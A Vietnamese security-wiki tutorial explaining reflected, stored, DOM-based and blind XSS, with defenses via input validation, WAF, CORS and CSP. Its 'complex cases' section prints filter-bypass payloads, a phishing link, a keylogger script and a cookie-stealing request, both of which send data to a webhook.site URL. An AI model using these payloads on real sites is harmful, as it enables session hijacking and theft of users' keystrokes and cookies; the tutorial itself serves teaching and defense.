---
title: XSS cơ bản | CORS và CSP
author:
    name: EHC-Wiki
date: 2020-11-03 00:13:00 +0700
categories: [Wiki, Web Exploitation]
tags: [wiki, web, xss]
mermaid: true
---

## XSS là gì

XSS - Cross-site Scripting là một kỹ thuật tấn công code injection trên phía client. Kẻ tấn công mục đích khai thác các dữ liệu nhạy cảm của người dùng khác bằng cách chèn các đoạn code độc hại trong trình duyệt Web, những mã độc này thường được viết với ngôn ngữ lập trình như Javascript, HTML…. Khai thác tấn công XSS chỉ thực sự xảy ra khi nạn nhân truy cập vào trang web hoặc ứng dụng thực thi các đoạn mã độc. 

![3](https://user-images.githubusercontent.com/82533607/145588467-062001db-782b-4f9c-b662-0646f04aae6b.png)

Về cơ bản, một ứng dụng có chứa lỗ hổng XSS đều xảy ra từ các trường input parameter được nhập vào từ người dùng, dữ liệu này sẽ chạy một cách hợp lệ trên trình duyệt, ứng dụng. Nguyên nhân chính của loại tấn công này là thiếu xác thực đầu vào dữ liệu người dùng, dữ liệu đầu ra trả về cho người dùng không được mã hóa và xử lý cẩn thận khiến những đoạn script độc hại có thể thực thi hợp lệ trên trình duyệt của nạn nhân.

Rủi ro:

- Người dùng bị chiếm phiên làm việc, đánh cắp cookie, token,…

- Thay đổi giao diện của ứng dụng, website.

- Quảng cáo hoặc bôi nhọ trang web, ứng dụng.

- Sử dụng phần cứng để nghe, chụp hình hay đào bitcoin.

## Các kiểu tấn công XSS

### Reflect XSS

Kẻ tấn công gửi cho nạn nhân một liên kết đến ứng dụng thông qua email, mạng xã hội,... nó chứa scripts độc hại được nhúng bên trong và sẽ thực thi khi truy cập trang web. Nó được gọi là reflect (ánh xạ) vì trong kịch bản khai thác này, hackers phải gửi cho nạn nhân một URL chứa scripts (phishing).

Nạn nhân chỉ cần truy cập URL này, hacker sẽ nhận được phản hồi chứa kết quả mong muốn.

Ví dụ, tại vị trí tìm kiếm của một ứng dụng, thay vì chèn nội dụng tìm kiếm bình thường, attacker chèn mã script, trình duyệt xử lý và hiện thị dữ liệu truyền vào trên màn hình. Và script độc hại được thực thi.

`/?q=%253c%252ftitle%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e`

![4](https://user-images.githubusercontent.com/82533607/145588852-999802ef-457f-4a29-a8d2-bf84a54709a3.png)

Thay vì hiện thị bảng thông báo cookie, attacker có thể thay bằng gửi cookie đến server của mình và có được phiên của nạn nhân.

### Stored XSS

Kẻ tấn công có thể chèn scripts vào những vị trí có thể lưu lại trong ứng dụng chứa lỗ hổng XSS, thường là lưu tại database và được hiện thị trên giao diện. Ví dụ như tên, comment, post được lưu trên ứng dụng, từ đó trình duyệt sẽ đọc và scripts được thực thi khi bất kỳ ai truy cập vào. Nạn nhân request đến thông tin được lưu trữ và bị đánh cắp thông tin. Gọi là Stored-XSS.

Khác với Reflect XSS là attacker phải gửi cho nạn nhân nhằm lừa nạn nhân truy cập. Còn với Stored XSS không cần phải thực hiện điều này. Ngoài ra, nó còn có thể tấn công nhiều nạn nhân mà chỉ cần một lần chèn scripts. Từ đó có thể thấy Stored XSS nguy hiểm hơn Reflect XSS rất nhiều, và nếu là quản trị hay người dùng cấp cao, hậu quả sẽ rất nghiêm trọng.

![5](https://user-images.githubusercontent.com/82533607/145588968-1a0418e6-57ce-41a2-8771-29a36d378a49.png)

Ví dụ, ứng dụng chứa lỗ hổng có lưu trữ bao gồm các trường hồ sơ như username hay email, thông tin lưu trên máy chủ đó hiển thị trên giao diện ứng dụng.

![6](https://user-images.githubusercontent.com/82533607/145589114-76355fc0-a0c3-4bdf-9bb3-9f6a976ff5df.png)

### DOM Based XSS

Scripts được chèn và sửa đổi DOM (Document Object Model) của trang web trong code phía nạn nhân và sau đó được thực thi, kỹ thuật này thay đổi cấu trúc DOM, cụ thể là HTML, nó làm thay đổi giao diện phía người dùng. Khác với reflect cũng là gửi để phishing nạn nhân nhưng không gửi dữ liệu đến server, nó trực tiếp chạy trên trình duyệt nạn nhân, điều này giảm thiểu filter từ phía server.

Ví dụ trang lấy giá trị parameter trên URL để hiển thị thông báo trên màn hình, thay vì chèn chuỗi thông báo, attacker chèn scripts và nó được thực thi trên trình duyệt nạn nhân.

### Blind XSS

Kỹ thuật này xảy ra khi kẻ tấn công không thể thấy được kết quả của cuộc tấn công vì kết quả lỗ hổng thường nằm trên một trang mà chỉ những người dùng được ủy quyền mới có thể truy cập. Kiểu khai thác này thường phải dùng payload phức tạp hơn để có thể nhận biết được nếu vị trí tồn tại lỗ hổng cũng như payload của kẻ tấn công được thực thi thành công.

Ví dụ lỗ hổng tại form feed back về ứng dụng, chỉ quản trị có thể đọc nội dung bị nhiễm mã khai thác.

## Một số case phức tạp hơn

### Bypass filter

Ví dụ filter blacklist không đầy đủ, hoặc payload được obfuscate: `<sCrIpT>alert('xss');</ScRiPt>`

Bypass trường hợp hợp thẻ `<script>` bị xóa trước khi hiển thị: `<svg o<script>nload=alert(1)>`

Kết quả: `<svg onload = alert(1)>`

Hoặc: `<%00script>alert(1)</script>`

`%00` trả về giá trị `null` khi đó 1 số filter không cẩn thận sẽ cho phép mã khai thác dạng này

Phishing: những thẻ hợp lệ như `<a>` cũng đều có thể được lợi dụng gây ra lỗ hổng XSS, ví dụ: 

```html
<a href=https://attacker/>Session expired. Please login again.</a>
<a href="javascript:alert(1)">Click Here</a>
```

Mã hóa: mã hóa payload là 1 trong các cách được attackers hay dùng ví dụ như encode scripts bằng URL, trình duyệt sẽ decode từ HTML/URL thành script và thực thi:

```js
%26%23x22%3B%3E%26%23x3C%3Bscript%3Ealert%26%23x28%3B1)%26%23x3C%3B/script%3E
```

Tạo Keylogger, attacker có chèn script ghi phím gõ trực tiếp của người dùng và gửi về server của kẻ tấn công ví dụ 1 đoạn script:

```html
<script>var keys="";

document.onkeypress = function(e) {

get = window.event?event:e;

key = get.keyCode?get.keyCode:get.charCode;

key = String.fromCharCode(key);

keys+=key;

}

window.setInterval(function(){

if(keys != "") {

new Image().src = "https://webhook.site/f6d7fb91-a0b3-4604-b1b2-853553ddd8a9?c="+keys;

keys = "";

}}, 500)</script>
```

Gửi request tới server: hacker có thể dùng nhiều hàm hỗ trợ để gửi request về server của hacker kèm dữ liệu nhạy cảm, ví dụ 1 case đơn giản:

```js
var request = new XMLHttpRequest(); request.open('GET', 'https://webhook.site/f6d7fb91-a0b3-4604-b1b2-853553ddd8a9/?a='+document.cookie, true); request.send();
```

Bypass CSRF: hacker có thể lợi dụng các thẻ như `iframe` để render trang được gán CSRF token để chống tấn công CSRF. Sau đó các dựa vào script XSS, hacker có thể đánh cắp token.

Ngoài ra còn rất nhiều kịch bản khác!

## Ngăn chặn XSS

### Data Validation

Giới hạn input của người dùng trong danh sách cụ thể, phương pháp này đảm bảo rằng chỉ các giá trị đã biết và an toàn mới được gửi đến máy chủ. Việc hạn chế input chỉ hoạt động nếu hệ thống biết có thể nhận được loại dữ liệu nào. Sử dụng thư viện có sẵn, vì các thư viện đó đã được nhiều developer sử dụng và thử nghiệm. Tuy nhiên, nó chỉ giúp giảm thiểu rủi ro, không đảm bảo đủ để ngăn chặn lỗ hổng XSS có thể xảy ra

Encode và xử lý dữ liệu đầu ra, kiểm tra nội dung không an toàn trước khi export hiển thị trên trình duyệt người dùng.

![7](https://user-images.githubusercontent.com/82533607/145590064-8eddac32-c33a-4c99-a2d0-c70769b0cc73.png)

### Sử dụng WAF

Sử dụng tường lửa để bảo vệ ứng dụng, hệ thống trước các cuộc tấn công. Phương pháp này chặn các cuộc tấn công như XSS, RCE hoặc SQLi trước khi các yêu cầu độc hại đến được hệ thống. Nó cũng có lợi ích là bảo vệ chống lại các cuộc tấn công quy mô lớn như DDOS.

### Cấu hình CORS

Cấu hình Cross-Origin Resource Sharing giúp ngăn các website khác đánh cắp traffic của ứng dụng, ví dụ như khi attacker nhúng script vào các websites để gửi các thông tin đánh cắp được về máy chủ khác.

### Cấu hình CSP

Chỉ định các tên miền để trình duyệt xem là nguồn hợp lệ của các script thực thi. Trình duyệt tương thích CSP sau đó sẽ chỉ thực thi các script được load trong nguồn nhận được từ các miền thuộc danh sách đó.